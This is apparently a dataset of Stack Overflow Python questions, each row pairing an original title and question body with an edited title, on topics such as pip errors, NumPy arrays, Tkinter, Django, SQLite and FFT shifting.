Using python to generate strings sequentially," I'm trying to create a loop to generate and print strings as follows:Alphanumeric characters only:0-9 are before A-Z, which are before a-z,Length goes up to 4 characters.So, it would print:all strings from 0-zthen from 00-zzthen from 000-zzzthen from 0000-zzzzthen it stops. <code> ",Generate alphanumeric strings sequentially
Can use pip anymore," When I try to use pip, I met this error: Obviously, I made some change to the system that broke pip. But I've no idea what it is. What might cause the exception above?Edit:What I can guess is that this morning, I crated a virtualenv, installed a package written by myself by running: python setup.py installin that environment.BTW, I did try to reinstall pip by running get-pip.py, didn't work <code>  Traceback (most recent call last): File ""/usr/local/bin/pip"", line 9, in <module> load_entry_point('pip==1.0.2', 'console_scripts', 'pip')() File ""/usr/local/lib/python2.6/dist-packages/distribute-0.6.21-py2.6.egg/pkg_resources.py"", line 337, in load_entry_point return get_distribution(dist).load_entry_point(group, name) File ""/usr/local/lib/python2.6/dist-packages/distribute-0.6.21-py2.6.egg/pkg_resources.py"", line 2281, in load_entry_point return ep.load() File ""/usr/local/lib/python2.6/dist-packages/distribute-0.6.21-py2.6.egg/pkg_resources.py"", line 1996, in load raise ImportError(""%r has no %r attribute"" % (entry,attr))ImportError: <module 'pip' from '/usr/lib/pymodules/python2.6/pip/__init__.pyc'> has no 'main' attribute",Can't use pip anymore
Why does 1 == True in Python?," Possible Duplicate: Is False == 0 and True == 1 in Python an implementation detail or is it guaranteed by the language? A brief transcript from my interactive console: Why on earth is this the case?Edit: For the sake of contrast, consider the is operator. That makes a lot of sense because though 1 and True both mean the same thing as the condition of an if statement, they really aren't the same thing.Edit again: More fun consequences of 1 == True: <code>  Python 2.7.2 (default, Jun 29 2011, 11:10:00) [GCC 4.6.1] on linux2Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> TrueTrue>>> 0 == TrueFalse>>> 1 == TrueTrue>>> 2 == TrueFalse >>> 0 is FalseFalse>>> 1 is TrueFalse>>> 0 is 0True>>> True is TrueTrue >>> d = {}>>> d[True] = ""hello"">>> d[1]""hello""",Why does 1 == True but 2 != True in Python?
Use pip and install packages at my $HOME folder?," Is it possible? When installing pip, install the python packages inside my $HOME folder. (for example, I want to install mercurial, using pip, but inside $HOME instead of /usr/local)I'm with a mac machine and just thought about this possibility, instead of ""polluting"" my /usr/local, I would use my $HOME instead.PEP370 is exactly about this. Is just creating a /.local and do a pip install package enough to make these packages to be installed only at my $HOME folder? <code> ",Installing pip packages to $HOME folder
How can I install packages in my $HOME folder with pip?," Is it possible? When installing pip, install the python packages inside my $HOME folder. (for example, I want to install mercurial, using pip, but inside $HOME instead of /usr/local)I'm with a mac machine and just thought about this possibility, instead of ""polluting"" my /usr/local, I would use my $HOME instead.PEP370 is exactly about this. Is just creating a /.local and do a pip install package enough to make these packages to be installed only at my $HOME folder? <code> ",Installing pip packages to $HOME folder
[python]: use re to find consecutively repeated chars," I want to find all consecutive, repeated character blocks in a string. For example, consider the following: What I want to find this: www, ooo and jjj. I tried to do it like this: But it doesn't seem to work as I expect. Any ideas?Also, how can I do it in Bash? <code>  s = r'http://www.google.com/search=ooo-jjj' m = re.search(r'(\w)\1\1', s)","How to use re to find consecutive, repeated chars"
How to use re to find consecutively repeated chars?," I want to find all consecutive, repeated character blocks in a string. For example, consider the following: What I want to find this: www, ooo and jjj. I tried to do it like this: But it doesn't seem to work as I expect. Any ideas?Also, how can I do it in Bash? <code>  s = r'http://www.google.com/search=ooo-jjj' m = re.search(r'(\w)\1\1', s)","How to use re to find consecutive, repeated chars"
How to find the min max with excluding zeros in a numpy array(or a tuple) in python?, I have an array. The valid values are not zero (either positive or negetive). I want to find the minimum and maximum within the array which should not take zeros into account. For example if the numbers are only negative. Zeros will be problematic. <code> ,Find the min/max excluding zeros in a numpy array (or a tuple) in python
"python 3, catch socket timeout"," I would like to catch the socket timeout (preferably in an exception) ... except urllib.error.URLError: can catch it but I need to distinguished between a dead link and a timeout .... If I take out the except urllib.error.URLError: the socket timeout does not catch and script terminates with an socket.timeout error <code>  import urllib.request,urllib.parse,urllib.errorimport socketimport httpsocket.setdefaulttimeout(0.1)try: file2 = urllib.request.Request('http://uk.geforce.com/html://') file2.add_header(""User-Agent"",""Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13"") file3 = urllib.request.urlopen(file2).read().decode(""utf8"", 'ignore')except urllib.error.URLError: print('fail')except socket.error: print('fail')except socket.timeout: print('fail')except UnicodeEncodeError: print('fail')except http.client.BadStatusLine: print('fail')except http.client.IncompleteRead: print('fail')except urllib.error.HTTPError: print('fail')print('done')",Catch socket timeout exception
parallell recursive function in python?," How do I parallelize a recursive function in Python?My function looks like this: When trying to parallelize it with multiprocessing.Pool.map, Windows opens an infinite number of processes and hangs.What's a good (preferably simple) way to parallelize it (for a single multicore machine)?Here is the code that hangs: <code>  def f(x, depth): if x==0: return ... else : return [x] + map(lambda x:f(x, depth-1), list_of_values(x))def list_of_values(x): # Heavy compute, pure function from multiprocessing import Poolpool = pool(processes=4)def f(x, depth): if x==0: return ... else : return [x] + pool.map(lambda x:f(x, depth-1), list_of_values(x))def list_of_values(x): # Heavy compute, pure function",Parallel recursive function in Python
parallel recursive function in python?," How do I parallelize a recursive function in Python?My function looks like this: When trying to parallelize it with multiprocessing.Pool.map, Windows opens an infinite number of processes and hangs.What's a good (preferably simple) way to parallelize it (for a single multicore machine)?Here is the code that hangs: <code>  def f(x, depth): if x==0: return ... else : return [x] + map(lambda x:f(x, depth-1), list_of_values(x))def list_of_values(x): # Heavy compute, pure function from multiprocessing import Poolpool = pool(processes=4)def f(x, depth): if x==0: return ... else : return [x] + pool.map(lambda x:f(x, depth-1), list_of_values(x))def list_of_values(x): # Heavy compute, pure function",Parallel recursive function in Python
What actually is pymysql and how it differs from mysqldb?," I just solved some problems in my Django 1.3 app by using PyMySQL instead of MySQLdb. I followed this tutorial on how to make the switch: http://web-eng-help.blogspot.com/2010/09/install-mysql-5-for-python-26-and.htmlNow I want to know what PyMySQL actually is and how it is different from MySQLdb.I am using it on localhost and will then upload it to some hosting.Is it fine to use PyMySQL on localhost and on hosting whatever they provide? Since I have changed ""MySQLdb"" in base.py and introspection.py to ""PyMySQL"", will I need to upload it to the server after changing these files? Or as it is Django's files, since Django will be uploaded there already, does it not matter much? <code> ",What is PyMySQL and how does it differ from MySQLdb? Can it affect Django deployment?
What actually is pymysql and how it differs from mysqldb? And how can it affect on my Django deployment?," I just solved some problems in my Django 1.3 app by using PyMySQL instead of MySQLdb. I followed this tutorial on how to make the switch: http://web-eng-help.blogspot.com/2010/09/install-mysql-5-for-python-26-and.htmlNow I want to know what PyMySQL actually is and how it is different from MySQLdb.I am using it on localhost and will then upload it to some hosting.Is it fine to use PyMySQL on localhost and on hosting whatever they provide? Since I have changed ""MySQLdb"" in base.py and introspection.py to ""PyMySQL"", will I need to upload it to the server after changing these files? Or as it is Django's files, since Django will be uploaded there already, does it not matter much? <code> ",What is PyMySQL and how does it differ from MySQLdb? Can it affect Django deployment?
What is pymysql and how does it differ from mysqldb? Can it affect Django deployment?," I just solved some problems in my Django 1.3 app by using PyMySQL instead of MySQLdb. I followed this tutorial on how to make the switch: http://web-eng-help.blogspot.com/2010/09/install-mysql-5-for-python-26-and.htmlNow I want to know what PyMySQL actually is and how it is different from MySQLdb.I am using it on localhost and will then upload it to some hosting.Is it fine to use PyMySQL on localhost and on hosting whatever they provide? Since I have changed ""MySQLdb"" in base.py and introspection.py to ""PyMySQL"", will I need to upload it to the server after changing these files? Or as it is Django's files, since Django will be uploaded there already, does it not matter much? <code> ",What is PyMySQL and how does it differ from MySQLdb? Can it affect Django deployment?
how to embed a terminal," I want to embed a terminal in my main Tkinter window. I would like to have a sub window where a terminal (Bash based terminal) would run. I would like also to be able to let my program interact with the terminal, at least I would like to read the current working directory and/or set it.I don't know if it is really impossible. I was able to do it in the past with Perl/Tk, so maybe it can be replicated here. The code I used then was something like: where $mw was the main Tk window.Of course, I completely agree with Bryan: though I never programmed with a GUI library before, my program (rather large, a kind of wiki) is running very well, with a surprisingly low amount of code devoted to the GUI itself.I tried translating this Perl code, but I'm stumbling on the ID problem. The only place where I found some reference to a way to extract the ID from Tkinter is in Effbot, but when I use it, I get 'AttributeError: Frame instance has no attribute 'window_id', so there must be something wrong: <code>  $frame3=$mw->Frame(-borderwidth=>2, -relief=>'groove', # -label=>'stuff for thought', -labelBackground=>CADRAWWINCOLOR,-background=>CADRAWWINCOLOR); $cv=$frame3->Canvas(-height=>$cvheight,-width=>$cvwidth,-background=>CADRAWWINCOLOR, -bg => CADRAWWINCOLOR, -relief => 'sunken')->pack(-expand => 1, -fill => 'both');# this Frame is needed for including the xterm in Tk::Canvas my $xtermContainer = $cv->Frame(-container => 1);my $xtid = $xtermContainer->id();# converting the id from HEX to decimal as xterm requires a decimal Idmy ($xtId) = sprintf hex $xtid;my $dcontitem = $cv->createWindow($xtermWidth/2,$xtermHeight/2, -window => $xtermContainer, -width => $xtermWidth, -height => $xtermHeight, -state => 'normal');system(""xterm -into $xtId -fn $fontname -geometry $geometry +sb -bg black -fg white -e ./xtermjob.pl $AAfname 5 &""); termf = Frame(root)termf.pack(side=BOTTOM, fill=X)id=termf.window_id() os.system(""xterm -into %d -fn -misc-fixed-medium-r-normal--8-80-75-75-c-50-iso10646-1 -geometry 150x150+0+0 +sb -bg black -fg white -e /root/.bashrc &"" % id); ",How to embed a terminal in a Tkinter application?
How to embed a terminal," I want to embed a terminal in my main Tkinter window. I would like to have a sub window where a terminal (Bash based terminal) would run. I would like also to be able to let my program interact with the terminal, at least I would like to read the current working directory and/or set it.I don't know if it is really impossible. I was able to do it in the past with Perl/Tk, so maybe it can be replicated here. The code I used then was something like: where $mw was the main Tk window.Of course, I completely agree with Bryan: though I never programmed with a GUI library before, my program (rather large, a kind of wiki) is running very well, with a surprisingly low amount of code devoted to the GUI itself.I tried translating this Perl code, but I'm stumbling on the ID problem. The only place where I found some reference to a way to extract the ID from Tkinter is in Effbot, but when I use it, I get 'AttributeError: Frame instance has no attribute 'window_id', so there must be something wrong: <code>  $frame3=$mw->Frame(-borderwidth=>2, -relief=>'groove', # -label=>'stuff for thought', -labelBackground=>CADRAWWINCOLOR,-background=>CADRAWWINCOLOR); $cv=$frame3->Canvas(-height=>$cvheight,-width=>$cvwidth,-background=>CADRAWWINCOLOR, -bg => CADRAWWINCOLOR, -relief => 'sunken')->pack(-expand => 1, -fill => 'both');# this Frame is needed for including the xterm in Tk::Canvas my $xtermContainer = $cv->Frame(-container => 1);my $xtid = $xtermContainer->id();# converting the id from HEX to decimal as xterm requires a decimal Idmy ($xtId) = sprintf hex $xtid;my $dcontitem = $cv->createWindow($xtermWidth/2,$xtermHeight/2, -window => $xtermContainer, -width => $xtermWidth, -height => $xtermHeight, -state => 'normal');system(""xterm -into $xtId -fn $fontname -geometry $geometry +sb -bg black -fg white -e ./xtermjob.pl $AAfname 5 &""); termf = Frame(root)termf.pack(side=BOTTOM, fill=X)id=termf.window_id() os.system(""xterm -into %d -fn -misc-fixed-medium-r-normal--8-80-75-75-c-50-iso10646-1 -geometry 150x150+0+0 +sb -bg black -fg white -e /root/.bashrc &"" % id); ",How to embed a terminal in a Tkinter application?
Python and unicode code point extraction," In Python API, is there a way to extract the unicode code point of a single character?Edit: In case it matters, I'm using Python 2.7. <code> ",Get unicode code point of a character using Python
Django: session database table cleanup, Does this table need to be purged or is it taken care of automatically by Django? <code> ,Session database table cleanup
"Java , Python : VirtualEnv for Java", Is there anything similar to Python virtualenv for Java or JVM Languages? <code> ,Is there anything like VirtualEnv for Java?
how to find the groups of consecutive elements from an array in numpy?," I have to cluster the consecutive elements from a NumPy array. Considering the following example The output should be a list of tuples as follows Here the difference is just one between the elements. It will be great if the difference can also be specified as a limit or a hardcoded number. <code>  a = [ 0, 47, 48, 49, 50, 97, 98, 99] [(0), (47, 48, 49, 50), (97, 98, 99)]",How to find the groups of consecutive elements in a NumPy array
Call a shell command containing a 'pipe' from Python and capture STDOUT, How would one call a shell command from Python which contains a pipe and capture the output? Suppose the command was something like: The Perl equivalent of what I am trying to do would be something like: <code>  cat file.log | tail -1 my $string = `cat file.log | tail -1`;,running a command line containing Pipes and displaying result to STDOUT
Python: modify Tuple," I have a 2 D tuple (Actually I thought, it was a list.. but the error says its a tuple)But anyways.. The tuple is of form:(floatnumber_val, prod_id)now I have a dictionary which contains key-> prod_id and value prod_namenow.. i want to change the prod_id in tuple to prod_nameSo this is waht I did umm pretty straightforwardbut i get an error that TypeError: 'tuple' object does not support item assignmentThanks!! <code>  #if prodName is the tuple# prodDict is the dictionaryfor i in range(len(prodName)): key = prodName[i][1] # get the prodid if prodDict.has_key(key): value = prodDict[key] prodName[i][1] = value",Python: can I modify a Tuple?
Python: How can execute a jar file through a python script," I have been looking for an answer for how to execute a java jar file through python and after looking at:Execute .jar from PythonHow can I get my python (version 2.5) script to run a jar file inside a folder instead of from command line?How to run Python egg files directly without installing them?I tried to do the following (both my jar and python file are in the same directory): and Neither have worked. So, I was thinking that I should use Jython instead, but I think there must a be an easier way to execute jar files through python. Do you have any idea what I may do wrong? Or, is there any other site that I study more about my problem? <code>  import osif __name__ == ""__main__"": os.system(""java -jar Blender.jar"") import subprocesssubprocess.call(['(path)Blender.jar'])",Python: How can I execute a jar file through a python script
Python csv writer wrong seperator?," Disclaimer: I'm in Europe.According to this page Excel uses the semicolon ; as default separator in Europe to ""prevent conflicts"" with the decimal comma.Now, I have this Python code: Which should generate this file: but instead it uses commas. Why is this happening? locale.getdefaultlocale() returns ('nl_NL', 'cp1252'). <code>  import csvdata = [[""test"", ""data""], [""foo"", ""bar""]]writer = csv.writer(open(""data.csv"", ""wb""), dialect=""excel"")writer.writerows(data) test;datafoo;bar",Python csv writer wrong separator?
python operator precedence of in and comparision," The following comparisons produce True: And with the parentheses the other way, I get a TypeError: So how do I get False with no parentheses? <code>  >>> '1' in '11'True>>> ('1' in '11') == TrueTrue >>> '1' in ('11' == True)Traceback (most recent call last): File ""<stdin>"", line 1, in <module>TypeError: argument of type 'bool' is not iterable >>> '1' in '11' == TrueFalse",python operator precedence of in and comparison
Python pip install and local repository, I am working on Windows 7.I have created a python egg using distutils. Now I try to install this egg in a virtual environment using pip 1.0.2 using the following command:Then I create a virtual environment myVirtualEnv I activate it using activate.bat then execute the following command:pip install path_to_my_local_folder#eggNameThis creates a copy of my egg in my myVirtualEnv\build directory but I have the following error: IOError: [Errno 2] No such file or directory: path_of_my_virtualEnv\build\PyEqdR\setup.pyDo you know why pip is looking for the setup.py file. Should I include it in the egg ? <code> ,Why does pip fail when installing local egg repository?
Problem with import Tkinter in Python," I'm trying to test GUI code using Python 3.2 with standard library Tkinter but I can't import the library.This is my test code: The shell reports this error: <code>  from Tkinter import *root = Tk()w = Label(root, text=""Hello, world!"")w.pack()root.mainloop() Traceback (most recent call last):File ""<pyshell#9>"", line 1, in <module>from Tkinter import *ImportError: No module named Tkinter",ImportError when importing Tkinter in Python
"How do I select additional, ""manual"" values along with an sqlalchemy query?"," I have a query which looks like this: It's a pretty basic query. In addition to pulling out the values for the Item, I want to append an additional value into the mix, and have it returned to me. In raw SQL, I would do this: How can I manually add that value via sqlalchemy? <code>  query = session.query(Item) \ .filter(Item.company_id == company_id) \ .order_by(Item.id) SELECT *, 0 as subscribedFROM itemsWHERE company_id = 34ORDER BY id",How do I select literal values in an sqlalchemy query?
How to select the an element row of a array.?," I have an array like this numpy array How would one loop through arrayselecting foo and getting 0.567 0.611 as floats as a singleton. Then select bar and getting 0.469 0.479 as floats as a singleton .....I could get vector the first elements as list by using The 'foo', and 'bar' elements are not unknown variables, they can change. How would I change if element is in position [1]? <code>  dd= [[foo 0.567 0.611] [bar 0.469 0.479] [noo 0.220 0.269] [tar 0.480 0.508] [boo 0.324 0.324]] dv= dd[:,1] [[0.567 foo2 0.611] [0.469 bar2 0.479] [0.220 noo2 0.269] [0.480 tar2 0.508] [0.324 boo2 0.324]]",How to select elements row-wise from a NumPy  array?
How to select the an element row of a array?," I have an array like this numpy array How would one loop through arrayselecting foo and getting 0.567 0.611 as floats as a singleton. Then select bar and getting 0.469 0.479 as floats as a singleton .....I could get vector the first elements as list by using The 'foo', and 'bar' elements are not unknown variables, they can change. How would I change if element is in position [1]? <code>  dd= [[foo 0.567 0.611] [bar 0.469 0.479] [noo 0.220 0.269] [tar 0.480 0.508] [boo 0.324 0.324]] dv= dd[:,1] [[0.567 foo2 0.611] [0.469 bar2 0.479] [0.220 noo2 0.269] [0.480 tar2 0.508] [0.324 boo2 0.324]]",How to select elements row-wise from a NumPy  array?
"Python, tkinter, changing the window basics"," I have built my first few scripts with a nice little GUI on them, as the tutorials have shown me, but none of them address what to do for a more complex program. If you have something with a 'start menu', for your opening screen, and upon user selection you move to a different section of the program and redraw the screen appropriately, what is the elegant way of doing this? Does one just .destroy() the 'start menu' frame and then create a new one filled with the widgets for another part? And reverse this process when they press the back button? <code> ",Switch between two frames in tkinter
POST JSON object (a list) with cURL," A user needs to pass a json object as a part of the request. It would look something like this: I have two problems right now. First, I can't figure out how to test this code by recreating the nested POST. I can successfully POST a dict but posting the list of addresses within the JSON object is messing me up. Simply using cURL, how might I do this? How might I do it with urrlib2?My second issue is then deserializing the JSON POST object on the server side. I guess I just need to see a successful POST to determine the input (and then deserialize it with the json module). Any tips? <code>  {""token"" :""ayaljltja"", ""addresses"": [ {'name':'Home','address':'20 Main Street', 'city':'new-york'}, {'name':'work', 'address':'x Street', 'city':'ohio'} ]}",Creating a nested JSON request with Python
try: except: or if: else:," Should I test if something is valid or just try to do it and catch the exception?Is there any solid documentation saying that one way is preferred?Is one way more pythonic?For example, should I: Or: Some thoughts...PEP 20 says: Errors should never pass silently. Unless explicitly silenced.Should using a try instead of an if be interpreted as an error passing silently? And if so, are you explicitly silencing it by using it in this way, therefore making it OK?I'm not referring to situations where you can only do things 1 way; for example: <code>  if len(my_list) >= 4: x = my_list[3]else: x = 'NO_ABC' try: x = my_list[3]except IndexError: x = 'NO_ABC' try: import fooexcept ImportError: import baz",Better to 'try' something and catch the exception or test if it's possible first to avoid an exception?
Better to 'try' something and catch the exception or test if its possible first to avoid an exception?," Should I test if something is valid or just try to do it and catch the exception?Is there any solid documentation saying that one way is preferred?Is one way more pythonic?For example, should I: Or: Some thoughts...PEP 20 says: Errors should never pass silently. Unless explicitly silenced.Should using a try instead of an if be interpreted as an error passing silently? And if so, are you explicitly silencing it by using it in this way, therefore making it OK?I'm not referring to situations where you can only do things 1 way; for example: <code>  if len(my_list) >= 4: x = my_list[3]else: x = 'NO_ABC' try: x = my_list[3]except IndexError: x = 'NO_ABC' try: import fooexcept ImportError: import baz",Better to 'try' something and catch the exception or test if it's possible first to avoid an exception?
django serialize queryset.values() into json," I have a model that has many fields, however for this problem I only need 3 of those fields. When I try to serialize a .values set I get an exception: 'dict' object has no attribute '_meta'This is my code: <code>  queryset = myModel.objects.filter(foo_icontains=bar).values('f1', 'f2', 'f3')serialized_q = serializers.serialize('json', queryset, ensure_ascii=False)",How to serialize Django queryset.values() into json?
What are the different options for social authentication on Appengine; how do they compare?," [This question is intended as a means to both capture my findings and sanity check them - I'll put up my answer toute suite and see what other answers and comments appear.]I spent a little time trying to get my head around the different social authentication options for (python) Appengine. I was particularly confused by how the authentication mechanisms provided by Google can interact with other social authentication mechanisms. The picture is complicated by the fact that Google has nice integration with third party OpenID providers but some of the biggest social networks are not OpenID providers (eg facebook, twitter). [Note that facebook can use OpenID as a relaying party, but not as a provider].The question is then the following: what are the different options for social authentication in Appengine and what are the pros and cons of each? <code> ",What are the different options for social authentication on Appengine - how do they compare?
Cython and deepcopy() woes. Any alternative ideas?," I've been playing with Cython recently for the speed ups, but my project inherits a module that has a copy() method which uses deepcopy(). I tried implementing the deepcopy() within an overrided version of copy(), and I thought I had it working, but it doesn't appear to be anymore. This is occuring in python/lib/copy_reg.py here: I'm on Python 2.7 here. Is it possible that a newer version of Python returns from deepcopy() in a ""safe"" way? I'm also on the latest version of Cython, 0.15.1.Update3Note that I've removed the previous updates to keep this as simple as possible.Ok! I think I found the incompatibility but I don't really know what to do about it. Then in my main app: I get: The key is the function/handle reference: If I don't include the method/function reference, Cython will not blow up during deepcopy. If I include one, it doesn't like how deepcopy/copy_reg copies the reference over.Any ideas besides not using method/function references? I have a bit of untangling to do if that the simple answer. (which I'm already working on as I finish typing this)Thanks! <code>  TypeError: object.__new__(cython_binding_builtin_function_or_method) is not safe, use cython_binding_builtin_function_or_method.__new__() return cls.__new__(cls, *args) class CythonClass: def __init__(self): self._handle = self._handles.get(""handle_method"") def call_handle(self): self._handle(self) def handle_method(self): print ""I'm a little handle!"" handles = {""handle_method"", handle_method} from cython1 import CythonClassfrom copy import deepcopyif __name__ == ""__main__"": gc1 = CythonClass() gc1.call_handle() gc2 = deepcopy(gc1) I'm a little handle!Traceback (most recent call last): File ""cythontest.py"", line 8, in <module> gc2 = deepcopy(gc1) File ""C:\python26\lib\copy.py"", line 162, in deepcopy y = copier(x, memo) File ""C:\python26\lib\copy.py"", line 292, in _deepcopy_inst state = deepcopy(state, memo) File ""C:\python26\lib\copy.py"", line 162, in deepcopy y = copier(x, memo) File ""C:\python26\lib\copy.py"", line 255, in _deepcopy_dict y[deepcopy(key, memo)] = deepcopy(value, memo) File ""C:\python26\lib\copy.py"", line 189, in deepcopy y = _reconstruct(x, rv, 1, memo) File ""C:\python26\lib\copy.py"", line 323, in _reconstruct y = callable(*args) File ""C:\python26\lib\copy_reg.py"", line 93, in __newobj__ return cls.__new__(cls, *args)TypeError: object.__new__(cython_binding_builtin_function_or_method) is not safe, use cython_binding_builtin_function_or_method.__new__() handles = {""handle_method"", handle_method}",Cython and deepcopy() woes with referenced methods/functions. Any alternative ideas?
Python - Mechanize select form FormNotFoundError," I want to select a form with mechanize. This is my code: The form's code: But I'm getting this Error: <code>  br = mechanize.Browser()self.br.open(url)br.select_form(name=""login_form"") <form id=""login_form"" onsubmit=""return Index.login_submit();"" method=""post"" action=""index.php?action=login&server_list=1""> mechanize._mechanize.FormNotFoundError: no form matching name 'login_form",Python Mechanize select form FormNotFoundError
When and how are a foreign key created when saving a model?," I have a set of document objects and label objects, and I want those two objects to be linked. It's a typical many-to-many relationship. I have the following code:Models.py: Views.py: When I upload a document, it gets added to the database, however no labels are being created or associated with the document. Do I need to explicitly add something to the Document's save() function to make this happen? Or somewhere in the Views.py file? I'd imagine it'd go something like:Check to see if the label that's being added already existsIf it doesn't, then create a new labelGrab both the current document_id and the new/existing label_idAdd a record to the document_labels table (automatically created for the many-to-many relationship)I feel like that's pretty standard functionality that I assumed would be built in to a many-to-many relationship in django, but it doesn't seem to be working for me so far. I'm trying to avoid reinventing the wheel here. <code>  class Document(models.Model): title = models.CharField(max_length=50, unique=True) title_slug = models.SlugField(max_length=50, unique=True, editable=False) labels = models.ManyToManyField('Label') def save(self, *args, **kwargs): self.title_slug = slugify(self.title) super(Document, self).save(*args, **kwargs)class Label(models.Model): name = models.CharField(max_length=40, unique=True) slug = models.SlugField(max_length=40, unique=True, editable=False) def save(self, *args, **kwargs): self.slug = slugify(self.name) super(Document, self).save(*args, **kwargs) class DocumentForm(ModelForm): class Meta: model = Document fields = [""title"",""labels""]def upload_document(request): if request.method == 'POST': form = DocumentForm(request.POST, request.FILES) if form.is_valid(): new_document = form.save() return HttpResponseRedirect(""/thanks/"") else: form = DocumentForm() return render_to_response('upload_page.html', {'form':form}, context_instance=RequestContext(request))",When and how is a many-to-many relationship created when saving a model?
When and how is a foreign key created when saving a model?," I have a set of document objects and label objects, and I want those two objects to be linked. It's a typical many-to-many relationship. I have the following code:Models.py: Views.py: When I upload a document, it gets added to the database, however no labels are being created or associated with the document. Do I need to explicitly add something to the Document's save() function to make this happen? Or somewhere in the Views.py file? I'd imagine it'd go something like:Check to see if the label that's being added already existsIf it doesn't, then create a new labelGrab both the current document_id and the new/existing label_idAdd a record to the document_labels table (automatically created for the many-to-many relationship)I feel like that's pretty standard functionality that I assumed would be built in to a many-to-many relationship in django, but it doesn't seem to be working for me so far. I'm trying to avoid reinventing the wheel here. <code>  class Document(models.Model): title = models.CharField(max_length=50, unique=True) title_slug = models.SlugField(max_length=50, unique=True, editable=False) labels = models.ManyToManyField('Label') def save(self, *args, **kwargs): self.title_slug = slugify(self.title) super(Document, self).save(*args, **kwargs)class Label(models.Model): name = models.CharField(max_length=40, unique=True) slug = models.SlugField(max_length=40, unique=True, editable=False) def save(self, *args, **kwargs): self.slug = slugify(self.name) super(Document, self).save(*args, **kwargs) class DocumentForm(ModelForm): class Meta: model = Document fields = [""title"",""labels""]def upload_document(request): if request.method == 'POST': form = DocumentForm(request.POST, request.FILES) if form.is_valid(): new_document = form.save() return HttpResponseRedirect(""/thanks/"") else: form = DocumentForm() return render_to_response('upload_page.html', {'form':form}, context_instance=RequestContext(request))",When and how is a many-to-many relationship created when saving a model?
When and how is a foreign key created when saving a model?," I have a set of document objects and label objects, and I want those two objects to be linked. It's a typical many-to-many relationship. I have the following code:Models.py: Views.py: When I upload a document, it gets added to the database, however no labels are being created or associated with the document. Do I need to explicitly add something to the Document's save() function to make this happen? Or somewhere in the Views.py file? I'd imagine it'd go something like:Check to see if the label that's being added already existsIf it doesn't, then create a new labelGrab both the current document_id and the new/existing label_idAdd a record to the document_labels table (automatically created for the many-to-many relationship)I feel like that's pretty standard functionality that I assumed would be built in to a many-to-many relationship in django, but it doesn't seem to be working for me so far. I'm trying to avoid reinventing the wheel here. <code>  class Document(models.Model): title = models.CharField(max_length=50, unique=True) title_slug = models.SlugField(max_length=50, unique=True, editable=False) labels = models.ManyToManyField('Label') def save(self, *args, **kwargs): self.title_slug = slugify(self.title) super(Document, self).save(*args, **kwargs)class Label(models.Model): name = models.CharField(max_length=40, unique=True) slug = models.SlugField(max_length=40, unique=True, editable=False) def save(self, *args, **kwargs): self.slug = slugify(self.name) super(Document, self).save(*args, **kwargs) class DocumentForm(ModelForm): class Meta: model = Document fields = [""title"",""labels""]def upload_document(request): if request.method == 'POST': form = DocumentForm(request.POST, request.FILES) if form.is_valid(): new_document = form.save() return HttpResponseRedirect(""/thanks/"") else: form = DocumentForm() return render_to_response('upload_page.html', {'form':form}, context_instance=RequestContext(request))",When and how is a many-to-many relationship created when saving a model?
Are sqlite reads always hitting disk ?, I have a Pylons application using SQLAlchemy with SQLite as backend. I would like to know if every read operation going to SQLite will always lead to a hard disk read (which is very slow compared to RAM) or some caching mechanisms are already involved. does SQLite maintain a subset of the database in RAM for faster access ? Can the OS (Linux) do that automatically ? How much speedup could I expect by using a production database (MySQL or PostgreSQL) instead of SQLite? <code> ,Are SQLite reads always hitting disk?
Are sqlite reads always hitting disk?, I have a Pylons application using SQLAlchemy with SQLite as backend. I would like to know if every read operation going to SQLite will always lead to a hard disk read (which is very slow compared to RAM) or some caching mechanisms are already involved. does SQLite maintain a subset of the database in RAM for faster access ? Can the OS (Linux) do that automatically ? How much speedup could I expect by using a production database (MySQL or PostgreSQL) instead of SQLite? <code> ,Are SQLite reads always hitting disk?
Maximum Likelihood Estimate -pseudo code," I need to code a Maximum Likelihood Estimator to estimate the mean and variance of some toy data. I have a vector with 100 samples, created with numpy.random.randn(100). The data should have zero mean and unit variance Gaussian distribution.I checked Wikipedia and some extra sources, but I am a little bit confused since I don't have a statistics background.Is there any pseudo code for a maximum likelihood estimator? I get the intuition of MLE but I cannot figure out where to start coding.Wiki says taking argmax of log-likelihood. What I understand is: I need to calculate log-likelihood by using different parameters and then I'll take the parameters which gave the maximum probability. What I don't get is: where will I find the parameters in the first place? If I randomly try different mean & variance to get a high probability, when should I stop trying? <code> ",Maximum Likelihood Estimate pseudocode
Dicrete Fourier Transform: How to use fftshift correctly with ifft," I want numerically compute the FFT on a numpy array Y. For testing, I'm using the Gaussian function Y = exp(-x^2). The (symbolic) Fourier Transform is Y' = constant * exp(-k^2/4). The naive approach fails: real(Y_k) jumps between positive and negative values, which correspond to a jumping phase, which is not present in the symbolic result. This is certainly not desirable. (The result is technically correct in the sense that abs(Y_k) gives the amplitudes as expected ifft(Y_k) is Y.)Here, the function fftshift() renders the array k monotonically increasing and changes Y_k accordingly. The pairs zip(k, Y_k) are not changed by applying this operation to both vectors.This changes appears to fix the issue: Is this the correct way to employ the fft() function if monotonic Y and Y_k are required?The reverse operation of the above is: For this case, the documentation clearly states that Y_k must be sorted compatible with the output of fft() and fftfreq(), which we can achieve by applying ifftshift().Those questions have been bothering me for a long time: Are the output and input arrays of both fft() and ifft() always such that a[0] should contain the zero frequency term, a[1:n/2+1] should contain the positive-frequency terms, and a[n/2+1:] should contain the negative-frequency terms, in order of decreasingly negative frequency [numpy reference], where 'frequency' is the independent variable?The answer on Fourier Transform of a Gaussian is not a Gaussian does not answer my question. <code>  import numpyX = numpy.arange(-100,100)Y = numpy.exp(-(X/5.0)**2) from numpy.fft import *from matplotlib import pyplotdef plotReIm(x,y): f = pyplot.figure() ax = f.add_subplot(111) ax.plot(x, numpy.real(y), 'b', label='R()') ax.plot(x, numpy.imag(y), 'r:', label='I()') ax.plot(x, numpy.abs(y), 'k--', label='abs()') ax.legend()Y_k = fftshift(fft(Y))k = fftshift(fftfreq(len(Y)))plotReIm(k,Y_k) Y_k = fftshift(fft(ifftshift(Y)))k = fftshift(fftfreq(len(Y)))plotReIm(k,Y_k) Yx = fftshift(ifft(ifftshift(Y_k)))x = fftshift(fftfreq(len(Y_k), k[1] - k[0]))plotReIm(x,Yx) ",Discrete Fourier Transform: How to use fftshift correctly with fft
